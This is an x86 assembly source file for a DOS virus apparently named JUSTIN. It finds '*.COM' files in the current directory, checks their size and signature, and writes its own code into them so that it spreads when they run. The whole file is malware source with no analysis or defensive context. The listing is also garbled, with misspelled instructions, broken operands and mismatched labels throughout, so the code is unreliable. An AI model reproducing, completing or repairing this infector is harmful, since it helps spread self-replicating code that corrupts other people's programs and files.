.model small
.code
	org 0100H

JUSTIN:
	call CHECK_MEM
	jc GITI_HoST_LOW
	call JUMP_HIGH
	call FIND_FILE
	jc GOTO_HOST_HIGH
	call INFECT__FILE

GOTO_HOST_HIGH:
	mov di,100H
	mov si,OFFSET_HOST
	mov ax,ss
	mov ds,ax
	mov es,ax
	push ax
	push di
	mov cs,sp
	sub cx,OFFSET HOST
	rep movsb
	retf

GOTO_HOST_LOW:
	mov ax,100H
	push ax
	mov ax,sp
	sub ax,6
	push ax

	mov ax,000C3H
	push ax
	mov ax,oA4F3H
	push ax

	mov si,OFFSET HOST
	mov di,100H
	mov cx,sp
	sub cx,OFFSET HOST

	cli 
	add sp,4
	ret
CHECK_ME:
	mov ah,4H
	x,2000H
	int 21H
	ushf
	mov ah,4AH
	mov bx,0FFFFH
	int 21H
	mov ah,4AH
	int 21H
	popf
	ret
JUMP_HIGH:
	mov ax,ds
	add ax,1000H
	mov es,ax
	mov si,100H
	mov cx,OFFSET HOST - 100H
	rep moab
	mov ds,ax
	mov ah,1AH
	mov dx,80H
	int 21H
	pop ex
	push es
	push ax
	retf
FIND_FILE:
	mov dx,OFFSET COM_MASK
	mov ah,4EH
	xor cx,cx
FIND_LOOP: int 21H
	jc FIND_EXIt
	call FILE_OK
	call FIND_NEXT

FIND_EXIT: ret
FIND_NEXT: mov ah,4FH
	jmp FIND_LOOP

COM_MASK db '*.COM',0


FILE_OK:
	mov dx,9EH
	mov ax,3D02H
	int 21H
	jc FOK_EXIT_c
	mov bx,ax
	mov ax,4200H
	xor cx,cx
	xor dx,dx
	int 21H
	jc FOK_EXIT_CCF
	or dx,dx


	jnz	FOK_EXIT_CCF
	mov cx,ax
	add ax,OFFSET HOST
	cmp ax,0FF00H
	jnc FOK_EXIT_C
	push cx
	mov ax,4200H


	xor cx,cx
	xor dx,dx
	int 21H
	jc FOK_EXIT_CCF
	or dx,dx
	add ax,OFFSET HOST
	cmp ax,0FF00H
	jnc	FOK_EXIT_C
	push c
	mov ax,4200H
	xor cx,cx
	xor dx,dx
	int 21H
	pop cx
	push cx
	mov ah,3FH
	mov dx,OFFSET HOST
	int 21H
	pop dx
	jc FOK_EXIT_CCF
	moc si,100H
	moc di,OFFSET HOST
	mov cx,10
	repz	cmpsw
	jz 	FOK_EXIT_CCF
	cmp WORD PTR cs:[HOST,'ZM'
	jz FoK_EXIT_CCF
	cmp FOK_EXIT_CCF
	ret

FOK_EXIT_CCF: mov ah,3EH
	int 21H
FOK_EXIT_C: stc
	ret

INFECT_FILE:
	push dx
	mov ax,4200H
	xor cx,cx
	xor dx,dx
	int 21H
	pop cx
	add cx,OFFSET HOST - 100H
	mov dx,100H
	mov ah,40H
	int 21H
	mov ah,3EH
	int 21H
	ret 
HOST:
	mov ax,4C00H
	int 21H
	end JUSTIN





